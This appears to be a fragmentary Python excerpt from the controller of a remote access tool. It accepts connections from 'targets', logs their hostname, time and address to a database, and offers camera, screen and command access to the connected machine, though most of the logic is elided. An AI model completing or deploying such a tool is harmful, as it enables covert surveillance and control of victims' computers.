...
def accept_req():
    click.play()
    global client_conn_obj,targets ,  waiting
    click.play()
    server.listen()
    print('Waiting......')
    waiting = True
    ...
    conn = sql.connect('GlitchDB.db')
    db_curdb = conn.cursor()
    # query = f'insert into target_info( {socket.gethostname()} , {currentDateTime} , {address})'
    # print(query)
    db_curdb.execute('insert into target_info values(?,?,?)',([str(socket.gethostname()),str(currentDateTime),str(address)]))
    conn.commit()
    conn.close()
...
def camera(btn):
    ...
    if cam_access_flag != 1:
        ...
        print('Enter q to abort camera access')
        # click.play()
        # cam_access_flag = 0
        # client_conn_obj.send(str.encode("cam_cmd abort camera access"))
        # buff_clr()
...
def screen(btn):
    ...
    if scrn_access_flag != 1:
        ...
        print('Enter q to abort screen access')
        # click.play()
        # scrn_access_flag = 0
        # client_conn_obj.send(str.encode("scrn_cmd abort screen access"))
        # buff_clr()
...
def cmd(btn):
    ...
    if cmd_access_flag != 1:
        ...
        print('Enter abort to abort cmd access')
        # click.play()
